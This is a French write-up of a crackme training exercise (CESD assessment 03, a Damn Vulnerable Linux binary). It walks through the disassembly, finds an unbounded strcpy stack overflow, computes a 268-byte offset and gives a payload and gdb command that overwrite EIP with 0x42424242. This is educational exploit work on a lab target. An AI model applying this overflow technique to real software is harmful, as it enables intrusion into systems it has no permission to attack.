# cesd_dvl_assessment_3 — zero (« 01_exploitme03 »)

- **Site** : [crackmes.one/crackme/5ab77f5333c5d40ad448c120](https://crackmes.one/crackme/5ab77f5333c5d40ad448c120) (réimport crackmes.de)
- **Auteur** : zero
- **Plateforme** : Unix/Linux — ELF 32-bit (Intel i386), non strippé, avec `debug_info`
- **Langage** : C (GCC, *Damn Vulnerable Linux*)
- **Difficulté** : 1.0 · **Qualité** : 4.0
- **Publié** : 2018-03-25 (réimport) — exercice de la certification CESD

> *Practical Assessment 03* de la certification **CESD** (IITAC). Comme les #01/#02,
> ce n'est pas un keygen : l'objectif est d'exploiter un débordement de tampon.
> Ici c'est le cas le plus pur : un `strcpy(buf, argv[1])` sans aucun préfixe.

## Le binaire

Le ZIP contient `01_exploitme03` (l'ELF) et le workbook `IITAC_CESD_Exercises.pdf`.

```
$ file 01_exploitme03
ELF 32-bit LSB executable, Intel i386, dynamically linked,
interpreter /lib/ld-linux.so.2, with debug_info, not stripped
```

SHA-256 de l'ELF extrait : `cc543b731165a01827c176d2803e1d79a54200be7fd3ecf5780f1e866b4d9b5d`.

## Comment on trouve

`objdump -d -M intel 01_exploitme03` sur `main` tient en quelques lignes :

```asm
08048384 <main>:
 8048384: push   ebp
 8048385: mov    ebp,esp
 8048387: sub    esp,0x118
 804838d: and    esp,0xfffffff0
 8048397: mov    eax,[ebp+0xc]        ; argv
 804839a: add    eax,0x4              ; &argv[1]
 804839d: mov    eax,[eax]            ; argv[1]
 804839f: mov    [esp+0x4],eax        ; src
 80483a3: lea    eax,[ebp-0x108]      ; dest = buf
 80483a9: mov    [esp],eax
 80483ac: call   80482b0 <strcpy@plt> ; strcpy(buf, argv[1])  ← pas de borne
 80483b1: leave
 80483b2: ret
```

Le programme copie `argv[1]` dans `buf = [ebp-0x108]` avec `strcpy`, **sans
contrôle de longueur**. Débordement de pile direct.

### Offset jusqu'à l'adresse de retour

- `buf` commence à `ebp-0x108`.
- L'`ebp` sauvegardé est à `ebp+0`, l'adresse de retour à `ebp+4`.
- Distance `buf → adresse de retour` : `0x108 + 4 = 0x10c = 268` octets.

Ici, contrairement à l'assessment 02, il n'y a **pas de préfixe** pré-chargé :
l'offset dans `argv[1]` est donc directement **268 octets**.

### Payload

```
"A" * 268  +  <adresse sur 4 octets little-endian>
```

Avec `"BBBB"` (= `0x42424242`) pour prouver le contrôle d'EIP.

## Section Debug GDB

On confirme en live que l'adresse de retour est bien contrôlée :

```
$ gdb -q -batch \
    -ex 'run $(python3 -c "import sys;sys.stdout.write(chr(65)*268+chr(66)*4)")' \
    -ex 'info registers eip' ./01_exploitme03
...
eip            0x42424242          0x42424242
```

`EIP = 0x42424242` : les quatre octets `BBBB` placés après 268 `A` écrasent
exactement l'adresse de retour. L'exploitation du débordement est démontrée.

## Réponse

Il n'y a pas de clé : l'exercice est de prendre le contrôle du flux. L'entrée
qui écrase EIP est :

```
./01_exploitme03 $(python3 -c 'print("A"*268 + "BBBB")')
```

→ `EIP = 0x42424242`.

## Reproduire

```
$ ./tools/crackmes-de-cesd_dvl_assessment_3-solve.py        # affiche l'offset/payload
$ ./tools/crackmes-de-cesd_dvl_assessment_3-solve.py --gdb  # prouve EIP=0x42424242 sous gdb
```
